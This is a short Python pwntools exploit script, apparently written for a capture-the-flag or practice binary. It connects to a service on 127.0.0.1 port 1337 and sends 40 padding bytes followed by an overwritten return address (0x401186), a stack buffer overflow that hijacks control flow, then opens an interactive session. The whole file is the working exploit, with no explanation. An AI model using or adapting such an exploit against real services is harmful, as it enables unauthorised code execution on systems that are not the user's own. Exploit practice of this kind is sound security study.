from pwn import *

p = remote("127.0.0.1", 1337)

payload = b"A" * 40
payload += p64(0x401186)
p.sendline(payload)

p.interactive()
